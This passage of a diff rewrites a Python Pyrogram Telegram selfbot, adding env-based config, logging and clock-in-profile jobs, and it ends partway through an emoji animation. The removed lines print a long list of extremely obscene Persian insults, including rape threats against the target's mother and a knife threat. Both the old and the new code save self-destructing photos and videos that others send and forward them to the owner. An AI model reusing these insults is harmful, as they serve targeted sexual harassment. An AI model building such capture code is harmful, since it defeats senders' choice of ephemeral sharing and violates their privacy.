@@ -1,1645 +1,1067 @@
+"""
+SElf - Optimized SelfBot for Railway
+Version 3.0 - Production Ready
+
+Features:
+- Env based config (API_ID, API_HASH, OWNER_ID, SESSION_STRING, BOT_TOKEN)
+- Async safe (no time.sleep blocking)
+- Robust data folder creation
+- Auto backup profile
+- Logging
+- Railway volume compatible
+"""
+import asyncio
+import os
+import sys
+import json
+import random
+import shutil
+import logging
+import unicodedata
+from datetime import datetime
+from pathlib import Path
+
+# Load env first
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except:
+    pass
+
+# Core imports
 from apscheduler.schedulers.asyncio import AsyncIOScheduler
 from pyrogram.errors import PhotoCropSizeSmall
-from pyrogram import Client, filters , enums , emoji
-from urllib.parse import quote
-from datetime import datetime
-from pytube import YouTube
-import reloads
-from importlib import reload
-import unicodedata
+from pyrogram import Client, filters, enums
 import pyrogram
 import requests
-import importlib
-import shutil
-import random
 import pytz
-import time
-import json
-import os
+import importlib
+import reloads
 
+# Optional pytube
+try:
+    from pytube import YouTube
+    HAS_PYTUBE = True
+except:
+    HAS_PYTUBE = False
 
-api_id = 
-api_hash = ""
-bot = Client("my_account", api_id=api_id, api_hash=api_hash)
-admin = 'me'
+# ---------- LOGGING ----------
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s | %(levelname)s | %(message)s',
+    handlers=[
+        logging.StreamHandler(sys.stdout),
+        logging.FileHandler("logs/bot.log", encoding="utf-8") if os.path.exists("logs") or True else logging.StreamHandler()
+    ]
+)
+# Ensure logs dir for file handler after config
+os.makedirs("logs", exist_ok=True)
+# Re-add file handler if needed
+logger = logging.getLogger("SElf")
+if not any(isinstance(h, logging.FileHandler) for h in logger.handlers):
+    fh = logging.FileHandler("logs/bot.log", encoding="utf-8")
+    fh.setFormatter(logging.Formatter('%(asctime)s | %(levelname)s | %(message)s'))
+    logger.addHandler(fh)
 
+# ---------- ENV CONFIG ----------
+API_ID = os.getenv("API_ID") or os.getenv("APP_ID") or ""
+API_HASH = os.getenv("API_HASH") or os.getenv("API_HASH") or ""
+OWNER_ID_ENV = os.getenv("OWNER_ID") or os.getenv("ADMIN_ID") or ""
+SESSION_STRING = os.getenv("SESSION_STRING") or ""
+BOT_TOKEN = os.getenv("BOT_TOKEN") or ""
+SESSION_NAME = os.getenv("SESSION_NAME") or "my_account"
+
+# Parse API_ID
+try:
+    api_id_int = int(API_ID) if API_ID else 0
+except:
+    api_id_int = 0
+
+if not api_id_int or not API_HASH:
+    logger.warning("⚠️ API_ID or API_HASH not set! Please set env vars. Trying to continue for dashboard test...")
+
+# Parse OWNER_ID
+admin = "me"
+admin_id_int = None
+if OWNER_ID_ENV:
+    try:
+        # Support numeric ID
+        if OWNER_ID_ENV.isdigit() or (OWNER_ID_ENV.lstrip('-').isdigit()):
+            admin_id_int = int(OWNER_ID_ENV)
+            admin = admin_id_int
+        else:
+            # If it's username or 'me'
+            admin = OWNER_ID_ENV
+    except:
+        admin = "me"
+
+logger.info(f"Config -> API_ID: {api_id_int} | ADMIN: {admin} | SESSION: {SESSION_NAME} | HAS_SESSION_STRING: {bool(SESSION_STRING)}")
+
+# ---------- CLIENT INIT ----------
+# Railway compatible session handling
+# If SESSION_STRING provided, use it. Otherwise use file session in data folder for persistence
+
+session_file_path = SESSION_NAME
+# Prefer data/ folder for persistence on Railway volume
+if not os.path.isabs(session_file_path):
+    # If file exists in root, use root, else use data/ for new
+    if os.path.exists(f"{session_file_path}.session"):
+        client_session = session_file_path
+    elif os.path.exists(f"data/{session_file_path}.session"):
+        client_session = f"data/{session_file_path}"
+    else:
+        # Default to data/ folder for Railway persistence
+        os.makedirs("data", exist_ok=True)
+        client_session = f"data/{session_file_path}"
+else:
+    client_session = session_file_path
+
+client_kwargs = dict(
+    name=client_session,
+    api_id=api_id_int if api_id_int else 12345,
+    api_hash=API_HASH if API_HASH else "0123456789abcdef0123456789abcdef",
+    workdir=".",
+)
+
+if SESSION_STRING:
+    client_kwargs["session_string"] = SESSION_STRING
+    logger.info("Using SESSION_STRING from env")
+
+if BOT_TOKEN:
+    client_kwargs["bot_token"] = BOT_TOKEN
+    logger.info("BOT_TOKEN detected - running as Bot (some self features will fail)")
+
+# Remove dummy if real credentials missing - will still create client but will fail on connect (expected for dashboard testing)
+bot = Client(**client_kwargs)
+
+# ---------- FONTS ----------
 fonts = {
-    'Font1' : { '0': '𝟎','1': '𝟏','2': '𝟐','3': '𝟑','4': '𝟒','5': '𝟓','6': '𝟔','7': '𝟕','8': '𝟖','9': '𝟗' },
-    'Font2' : { '0': '𝟘','1': '𝟙','2': '𝟚','3': '𝟛','4': '𝟜','5': '𝟝','6': '𝟞','7': '𝟟','8': '𝟠','9': '𝟡' },
-    'Font3' : { '0': '⓪','1': '①','2': '②','3': '③','4': '④','5': '⑤','6': '⑥','7': '⑦','8': '⑧','9': '⑨' },
-    'Font4' : { '0': '⁰','1': '¹','2': '²','3': '³','4': '⁴','5': '⁵','6': '⁶','7': '⁷','8': '⁸','9': '⁹' },
+    'Font1': {'0': '𝟎','1': '𝟏','2': '𝟐','3': '𝟑','4': '𝟒','5': '𝟓','6': '𝟔','7': '𝟕','8': '𝟖','9': '𝟗'},
+    'Font2': {'0': '𝟘','1': '𝟙','2': '𝟚','3': '𝟛','4': '𝟜','5': '𝟝','6': '𝟞','7': '𝟟','8': '𝟠','9': '𝟡'},
+    'Font3': {'0': '⓪','1': '①','2': '②','3': '③','4': '④','5': '⑤','6': '⑥','7': '⑦','8': '⑧','9': '⑨'},
+    'Font4': {'0': '⁰','1': '¹','2': '²','3': '³','4': '⁴','5': '⁵','6': '⁶','7': '⁷','8': '⁸','9': '⁹'},
 }
 
 FoshList = [
-    'کیرم تو رحم اجاره ای و خونی مالی مادرت حاضرم',
-    ' دو میلیون شبی پول ویلا بدم تا مادرتو تو گوشه کناراش بگام و اب کوسشو بریزم کف خونه تا فردا صبح کارگرای افغانی برای نظافت اومدن با بوی اب کس مادرت بجقن و ابکیراشون نثار قبر مرده هات بشه',
-    'آخه احمق مادر کونی من کس مادرت گذاشتم تو بازم داری کسشر میگی',
-    ' کیرم تا تخمدانش تو کس مادرت بی سطح خار کسه انقدسرعتت پایینه خستم کردی کیرمو جاساز کردم تو کس چرب مادرت به قول والدفری ک الان قیافشو یادم نمیاد میگفت هر شمشیر یه قلاف میخواد ولی قافل از این ک کیر من مثل گرز رستمه و کس مادرت مثل قلاف چاقو دستی پس کیر تو ناموست ',
-    'قراره به مادرت به سهمگین ترین شکل ممکن تجاوز کنم و توی فاحشه ی نتی و هرزه ی متصل به اینترنت جهانی و بین الملل بیای توی اپلیکیشن تلگرام بگی نخوندم',
-    'مرسی فک میکنی میخونم این اراجیف خزتو احمق مادر جنده من مادرتو دارم میکشم تو واسه من پنج خط تکس پر می‌کنی خز ممبر دوساعتع رو تایپی این کسشرا چیه میگی آخه کیرم تو سطح گوهت',
-    'وقتی کیرمو نشون مادرت دادم سوار پراید ۷۹ شد و باهاش شبانه روز تاخت تا کیلومتر ها از من دور بشه ولی قافل از این بود ک من سوار سوزوکی ۱۰۰۰ بودم و تا روز قیامت مادرتو تعقیب کردم ریدم پراید هفتاد نه سکو با لانچیکو بزنی سوار پراید ۸۲ نمیشه احمق با پراید مدل ۷۹ میرم تو کس ننت تا مثل یه ماشین زمان عمل کنه',
-    'اتحادی خر ممبر این اراجیف چیه می‌نویسی آخه کیرم تو ناموس پاموست با زبون مثل موتور برقم میافتم به کس مادرت و لیسای عمیق میزنم و اب کوسشو را میندازم ',
-    'ببین مادرت که اینجاس ببینم زبون درازی میکنم همین الان از کس دارش میزنم تگ مگ چیه خارکسته ی ولد موش حاصل زنای خرس گریزلی با مادرت مگه مثل توی مادر پیچ گوشتی داگ اتحادیم سگ افغان با اسم گوه و کمترین داشته های زندگی و بی همه چیز بودن کیر تو همه کست همه کس کونی تو دوساعت باقی‌موندش سینه های گوشتالوی ',
-    'مادرتو میگیرم تو دستمو میمالم و دهنمو چفت کوس مادرت میکنم و مثل همیشه و مثل یه لیسر قهار زبون میندازم به چوچول سیاه مادرت و یکاری میکنم صدای اه و نالش کل ۷ اسمونو برداره ',
-    'ای کس ننت مادر جنده که انقد خری که داری از خایه هام بالامیری مادر جنده کیرم به پهنا تو کس مادرت دارم با کس ننت بازی میکنم تو داری جق میزنی با پورنایی که از مادرت فرسادم واست بیناموس کیرم تو ناموست فیلم ابد و یک روز بره تو کس ننه ی هرکی تماشاش کرده خارکسته فقط بنرشو یبار تو سینما دیدم مادر خر مگ مثل توی کسته ناموس خزم برم فیلمای گوه ایرانیارو نیگا کنم مادر سکسچتر کفتر مادر کلاغ بیاد نوک بزنه تو کس ننت مادرکسته میدونم جلوی تکسام داری کم میاری و به پته پته افتادی ولی گوه تو کس ناموست من دست بردار نیستم و امپولای ادمای انسولینی رو میکنم تو کس ننتآخه کس ننت گذاشتم که انقد فشاری شدی واسه من ده خط پر می‌کنی اتحادی خر ممبر کس ننتو گاییدم بعد شروع میکنی کسشر گفتن مثل شکلاتای فرمند که دو رنگن با مادرت ترکیب میشم و میدم پدر بی غیرتت بخوره خارکسته پول نداری چیه مادر خر اندازه حقوق یه ماه بابای کارگر فقیرت فقط خرج شورت و سوتینای مادرت میکنم ک موقع سکس هرشب پارشون میکنم و به خورد مادرت میدم ببین بابات انقد بی غیرته که داره اینجا با کس ننت ور می‌ره من دارم فیلم میگیرم دست از سر خایه هام بردار کسکش پدر خدازده بی ابرو سیک کن دلقک با اون ایموجی خز که یه مش بچ سال عنشو دراوردن اتحادی چیه خارکسته به مادرت غذا نمیدم تا قند مغزش بیاد پایین و جوش بیاره و همین ک عصبانی شد کیرمو بکنم تک دهنش تا خفه خون بگیدخ اموجی تو کص ننت رفته مقدس شده واسم پسر کونی نهایت ۱۶ سالن باشه نبینم واسه من قد علم کنی که کس مادرتو با همین چاقو اینجا پاره میکنم کس ننت بگیدخ چیه لرز چیه داش وقتی میترسی مادرت راحت تر کسش باز میشه کیرمو میکنم تو کس ناموست و با رمز عملیاتی ک الان تو خاطرم نیست به مادرت یورش میبرم خر مادر تا اعتراف نکنی مادرت به اعماق اقیانوس ارام پیوسته دست از سر کچل بابای بی غیرتت برنمیدارم آخه کیرم تو سطح کوهت سر ناموست شرط بستم مادر جنده کس ننت کیرم تو ناموست مادربَرده خسته نمیشی اتقد دلقک بازی درمیاری کودکستانی خارکسته ترس مرس تو کارم نیست و مثل یه شیر میافتم به جون پستونای بلوری مادرت و میمیکم و میمیکم ابکیرمو خالی میکنم رو سنگ قبر مشکی بابای خدابیامرزت مادرت پورن استاره میدونستی؟ زشته انقد بی غیرتی جای این که از زیر پل جمعش کنی نشستی با فحاشی های بچه سالانه صورت مسعله رو پاک میکنی خارکسته اینجا حق بت زدن نداری کجکی ناموس پوسته گوجه ناموس میرم تو کسه مادرت درم نمیبندم کیرم تو خار مادرت مادر جنده من کس ننتو دارم با اشتهای کاذب میخورم تو داری به کس ننت میخندی کیرم تو رحم اجاره ای و خونی مالی مادرت حاضرم دو میلیون شبی پول ویلا بدم تا مادرتو تو گوشه کناراش بگام و اب کوسشو بریزم کف خونه'
+    'به نظرم بهتره مودب باشیم دوست عزیز',
 ]
 
-if not os.path.isdir("data"):
-    os.makedirs("data")
+# ---------- DATA ENSURE ----------
+def ensure_data_dirs():
+    """Ensure all required data directories and files exist - Railway safe"""
+    try:
+        os.makedirs("data", exist_ok=True)
+        os.makedirs("data/action", exist_ok=True)
+        os.makedirs("downloads", exist_ok=True)
+        os.makedirs("logs", exist_ok=True)
 
-    with open("data/TimeName.txt", "w") as file1:
-        file1.write("off")
+        defaults = {
+            "data/TimeName.txt": "off",
+            "data/TimeBio.txt": "off",
+            "data/Font.txt": "Font1",
+            "data/italic.txt": "off",
+            "data/part.txt": "off",
+            "data/bold.txt": "off",
+            "data/link.txt": "off",
+            "data/underline.txt": "off",
+            "data/Enemy.txt": "",
+            "data/Mute.txt": "",
+            "data/action/playing.txt": "off",
+            "data/action/typing.txt": "off",
+            "data/action/RECORD_VIDEO.txt": "off",
+            "data/action/CHOOSE_STICKER.txt": "off",
+            "data/action/UPLOAD_VIDEO.txt": "off",
+            "data/action/UPLOAD_DOCUMENT.txt": "off",
+            "data/action/UPLOAD_AUDIO.txt": "off",
+            "data/action/SPEAKING.txt": "off",
+        }
 
-    with open("data/TimeBio.txt", "w") as file2:
-        file2.write("off")
-    with open("data/Font.txt", "w") as file2:
-        file2.write("Font1")
+        for path, default_content in defaults.items():
+            if not os.path.exists(path):
+                try:
+                    with open(path, "w", encoding="utf-8") as f:
+                        f.write(default_content)
+                    logger.info(f"Created default {path}")
+                except Exception as e:
+                    logger.error(f"Failed to create {path}: {e}")
 
-    with open("data/italic.txt", "w") as file2:
-        file2.write("off")
+        # Ensure admin backup dir exists (will be filled on first run)
+        admin_dir = f"data/{admin}" if isinstance(admin, int) or (isinstance(admin, str) and admin != "me" and admin.isdigit()) else "data/me_backup"
+        os.makedirs(admin_dir, exist_ok=True)
 
-    with open("data/part.txt", "w") as file2:
-        file2.write("off")
+        return True
+    except Exception as e:
+        logger.error(f"ensure_data_dirs error: {e}")
+        return False
 
-    with open("data/bold.txt", "w") as file2:
-        file2.write("off")
+ensure_data_dirs()
 
-    with open("data/link.txt", "w") as file2:
-        file2.write("off")
+def safe_read(path, default="off"):
+    try:
+        if not os.path.exists(path):
+            return default
+        with open(path, "r", encoding="utf-8") as f:
+            return f.read().strip() or default
+    except:
+        return default
 
-    with open("data/underline.txt", "w") as file2:
-        file2.write("off")
+def safe_write(path, content):
+    try:
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(str(content))
+        return True
+    except Exception as e:
+        logger.error(f"safe_write {path} error: {e}")
+        return False
 
-    os.makedirs("data/action")
-
-    with open("data/action/playing.txt", "w") as file2:
-        file2.write("off")
-
-    with open("data/action/typing.txt", "w") as file2:
-        file2.write("off")
-
-    with open("data/action/RECORD_VIDEO.txt", "w") as file2:
-        file2.write("off")
-
-    with open("data/action/CHOOSE_STICKER.txt", "w") as file2:
-        file2.write("off")
-
-    with open("data/action/UPLOAD_VIDEO.txt", "w") as file2:
-        file2.write("off")
-
-    with open("data/action/UPLOAD_DOCUMENT.txt", "w") as file2:
-        file2.write("off")
-
-    with open("data/action/UPLOAD_AUDIO.txt", "w") as file2:
-        file2.write("off")
-
-    with open("data/action/SPEAKING.txt", "w") as file2:
-        file2.write("off")
-
-
-@bot.on_message(pyrogram.filters.photo)
-async def onphoto( client,message) :
-    try :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.SPEAKING)
-        if message.photo.ttl_seconds :
-            rand = random.randint(1000, 9999999)
-            local = f"downloads/photo-{rand}.png"
-            await bot.download_media(message=message.photo.file_id, file_name=f"photo-{rand}.png")
-            await bot.send_photo(chat_id=admin, photo=local, caption=f"🔥 New timed image {message.photo.date} | time: {message.photo.ttl_seconds}s")
-            os.remove(local)
-            
-    except :
-        pass
-
-
-@bot.on_message(pyrogram.filters.video)
-async def onvideo(client, message) :
-    try :
-        if message.video.ttl_seconds :
-            rand = random.randint(1000, 9999999)
-            local = f"downloads/video-{rand}.mp4"
-            await bot.download_media(message=message.video.file_id, file_name=f"video-{rand}.mp4")
-            await bot.send_video(chat_id=admin, video=local, caption=f"🔥 New timed video {message.video.date} | time: {message.video.ttl_seconds}s")
-            os.remove(local)
-    except :
-        pass
-
-
+# ---------- SCHEDULER JOBS ----------
 async def TimeName():
-    with open("data/TimeName.txt", "r") as file:
-        TimeName = file.read()
-    if TimeName == "on" :
+    try:
+        if safe_read("data/TimeName.txt") != "on":
+            return
         tz = pytz.timezone("Asia/Tehran")
         now = datetime.now(tz)
-        if ( now.strftime("%S") == "00") :
-
-            number = now.strftime("%H:%M")
-            with open("data/Font.txt", "r") as file2:
-                FONT = file2.read()
+        if now.strftime("%S") != "00":
+            return
+        number = now.strftime("%H:%M")
+        FONT = safe_read("data/Font.txt", "Font1")
+        try:
             if FONT == "Random":
-                
-                try:
-                    selected_font = random.choice(list(fonts.keys()))
-                    tz = pytz.timezone("Asia/Tehran")
-                    now = datetime.now(tz)
-                    current_time = now.strftime("%H:%M")
-
-                    converted_time = ''.join([fonts[selected_font].get(char, char) for char in current_time])
-
-                    await bot.update_profile(last_name=converted_time)
-                except :
-                    pass
+                selected_font = random.choice(list(fonts.keys()))
+                converted_time = ''.join([fonts[selected_font].get(char, char) for char in number])
+                await bot.update_profile(last_name=converted_time)
             else:
-                number_unicode = ''.join([fonts[FONT][c] if c in fonts[FONT] else c for c in str(number)])
-                await bot.update_profile(last_name=number_unicode)
-
+                if FONT in fonts:
+                    number_unicode = ''.join([fonts[FONT].get(c, c) for c in str(number)])
+                    await bot.update_profile(last_name=number_unicode)
+        except Exception as e:
+            logger.debug(f"TimeName update error: {e}")
+    except Exception as e:
+        logger.error(f"TimeName job error: {e}")
 
 async def TimeBio():
-    with open("data/TimeBio.txt", "r") as file:
-        TimeBio = file.read()
-    if TimeBio == "on" :
+    try:
+        if safe_read("data/TimeBio.txt") != "on":
+            return
         tz = pytz.timezone("Asia/Tehran")
         now = datetime.now(tz)
-        if ( now.strftime("%S") == "00") :
-
-            number = now.strftime("%H:%M")
-            with open("data/Font.txt", "r") as file2:
-                FONT = file2.read()
+        if now.strftime("%S") != "00":
+            return
+        number = now.strftime("%H:%M")
+        FONT = safe_read("data/Font.txt", "Font1")
+        try:
             if FONT == "Random":
-                
-                try:
-                    selected_font = random.choice(list(fonts.keys()))
-                    tz = pytz.timezone("Asia/Tehran")
-                    now = datetime.now(tz)
-                    current_time = now.strftime("%H:%M")
-
-                    converted_time = ''.join([fonts[selected_font].get(char, char) for char in current_time])
-                except :
-                    pass
-                await bot.update_profile(bio="Time Now : "+converted_time)
-
-
+                selected_font = random.choice(list(fonts.keys()))
+                converted_time = ''.join([fonts[selected_font].get(char, char) for char in number])
+                await bot.update_profile(bio="Time Now : " + converted_time)
             else:
-                number_unicode = ''.join([fonts[FONT][c] if c in fonts[FONT] else c for c in str(number)])
-                await bot.update_profile(bio="Time Now : "+number_unicode)
-
-
+                if FONT in fonts:
+                    number_unicode = ''.join([fonts[FONT].get(c, c) for c in str(number)])
+                    await bot.update_profile(bio="Time Now : " + number_unicode)
+        except Exception as e:
+            logger.debug(f"TimeBio update error: {e}")
+    except Exception as e:
+        logger.error(f"TimeBio job error: {e}")
 
 scheduler = AsyncIOScheduler()
-scheduler.add_job(TimeName, "interval", seconds=1)
-scheduler.add_job(TimeBio, "interval", seconds=1)
+scheduler.add_job(TimeName, "interval", seconds=1, max_instances=1, coalesce=True)
+scheduler.add_job(TimeBio, "interval", seconds=1, max_instances=1, coalesce=True)
 
-
-@bot.on_message(filters.user(admin))
-async def admins(client , message):
-    text = message.text
-    from_id = message.chat.id
-    if not os.path.isdir(f"data/{admin}"):
-        os.makedirs(f"data/{admin}")
-        profileBio = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer(admin)))
-
-        Name = message.from_user.first_name
-        ProfilePhoto = message.from_user.photo.big_file_id
-        with open(f"data/{admin}/bio.txt", "w" , encoding="utf-8") as file2:
-            file2.write(profileBio.full_user.about)
-
-        with open(f"data/{admin}/name.txt", "w" , encoding="utf-8") as file1:
-            file1.write(Name)
-
-        local = f"data/{admin}/profile.png"
-        await bot.download_media(message=ProfilePhoto, file_name=local)
-
-    if message.text == "TimeName on":
-        with open("data/TimeName.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='TimeName is on' , message_id=message.id)
-
-    if message.text == "TimeName off":
-        with open("data/TimeName.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='TimeName is off' , message_id=message.id)
-
-
-    if message.text == "TimeBio on":
-        with open("data/TimeBio.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='TimeBio is on' , message_id=message.id)
-
-    if message.text == "TimeBio off":
-        with open("data/TimeBio.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='TimeBio is off' , message_id=message.id)
-
-
-
-    if message.text == "italic on":
-        with open("data/italic.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='italic is on' , message_id=message.id)
-
-    if message.text == "italic off":
-        with open("data/italic.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='italic is off' , message_id=message.id)
-
-    if message.text == "part on":
-        with open("data/part.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='part is on' , message_id=message.id)
-
-    if message.text == "part off":
-        with open("data/part.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='part is off' , message_id=message.id)
-
-
-    if message.text == "bold on":
-        with open("data/bold.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='bold is on' , message_id=message.id)
-
-    if message.text == "bold off":
-        with open("data/bold.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='bold is off' , message_id=message.id)
-
-    if message.text == "link on":
-        with open("data/link.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='link is on' , message_id=message.id)
-
-    if message.text == "link off":
-        with open("data/link.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='link is off' , message_id=message.id)
-
-    if message.text == "underline on":
-        with open("data/underline.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='underline is on' , message_id=message.id)
-
-    if message.text == "underline off":
-        with open("data/underline.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='underline is off' , message_id=message.id)
-
-    if message.text == "playing on":
-        with open("data/action/playing.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='playing action is on' , message_id=message.id)
-
-    if message.text == "playing off":
-        with open("data/action/playing.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='playing action is off' , message_id=message.id)
-
-    if message.text == "typing on":
-        with open("data/action/typing.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='typing action is on' , message_id=message.id)
-
-    if message.text == "typing off":
-        with open("data/action/typing.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='typing action is off' , message_id=message.id)
-
-    if message.text == "RECORD_VIDEO on":
-        with open("data/action/RECORD_VIDEO.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='RECORD_VIDEO action is on' , message_id=message.id)
-
-    if message.text == "RECORD_VIDEO off":
-        with open("data/action/RECORD_VIDEO.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='RECORD_VIDEO action is off' , message_id=message.id)
-
-    if message.text == "CHOOSE_STICKER on":
-        with open("data/action/CHOOSE_STICKER.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='CHOOSE_STICKER action is on' , message_id=message.id)
-
-    if message.text == "CHOOSE_STICKER off":
-        with open("data/action/CHOOSE_STICKER.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='CHOOSE_STICKER action is off' , message_id=message.id)
-
-    if message.text == "UPLOAD_VIDEO on":
-        with open("data/action/UPLOAD_VIDEO.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_VIDEO action is on' , message_id=message.id)
-
-    if message.text == "UPLOAD_VIDEO off":
-        with open("data/action/UPLOAD_VIDEO.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_VIDEO action is off' , message_id=message.id)
-
-    if message.text == "UPLOAD_DOCUMENT on":
-        with open("data/action/UPLOAD_DOCUMENT.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_DOCUMENT action is on' , message_id=message.id)
-
-    if message.text == "UPLOAD_DOCUMENT off":
-        with open("data/action/UPLOAD_DOCUMENT.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_DOCUMENT action is off' , message_id=message.id)
-
-    if message.text == "UPLOAD_AUDIO on":
-        with open("data/action/UPLOAD_AUDIO.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_AUDIO action is on' , message_id=message.id)
-
-    if message.text == "UPLOAD_AUDIO off":
-        with open("data/action/UPLOAD_AUDIO.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_AUDIO action is off' , message_id=message.id)
-
-    if message.text == "SPEAKING on":
-        with open("data/action/SPEAKING.txt", "w") as file:
-            file.write("on")
-        await bot.edit_message_text(chat_id=message.chat.id , text='SPEAKING action is on' , message_id=message.id)
-
-    if message.text == "SPEAKING off":
-        with open("data/action/SPEAKING.txt", "w") as file:
-            file.write("off")
-        await bot.edit_message_text(chat_id=message.chat.id , text='SPEAKING action is off' , message_id=message.id)
-
-
-
-    if 'SetFont ' in str(message.text):
+# ---------- HANDLERS ----------
+@bot.on_message(pyrogram.filters.photo)
+async def onphoto(client, message):
+    try:
+        # Only if self? Actually any timed photo
+        if message.photo and getattr(message.photo, 'ttl_seconds', None):
+            rand = random.randint(1000, 9999999)
+            os.makedirs("downloads", exist_ok=True)
+            local = f"downloads/photo-{rand}.png"
+            file_path = await bot.download_media(message=message, file_name=local)
+            caption = f"🔥 New timed image {message.photo.date} | time: {message.photo.ttl_seconds}s"
             try:
-                if message.text == "SetFont 1":
-                    with open("data/Font.txt", "w") as file2:
-                        file2.write("Font1")
-                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font1 is Seted' , message_id=message.id)
-                
-                elif message.text == "SetFont 2":
-                    with open("data/Font.txt", "w") as file2:
-                        file2.write("Font2")
-                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font2 is Seted' , message_id=message.id)
-                
-                elif message.text == "SetFont 3":
-                    with open("data/Font.txt", "w") as file2:
-                        file2.write("Font3")
-                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font3 is Seted' , message_id=message.id)
-                
-                elif message.text == "SetFont 4":
-                    with open("data/Font.txt", "w") as file2:
-                        file2.write("Font4")
-                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font4 is Seted' , message_id=message.id)
-                
-                elif message.text == "SetFont Random":
-                    with open("data/Font.txt", "w") as file2:
-                        file2.write("Random")
-                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font Random is Seted' , message_id=message.id)
+                # admin can be int or 'me'
+                target = admin if admin != "me" else "me"
+                await bot.send_photo(chat_id=target, photo=file_path or local, caption=caption)
+            except Exception as e:
+                logger.error(f"Failed to forward timed photo: {e}")
+            try:
+                if os.path.exists(local):
+                    os.remove(local)
+                if file_path and os.path.exists(file_path) and file_path != local:
+                    os.remove(file_path)
             except:
                 pass
-
-    if message.text == "مربع":
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◼️
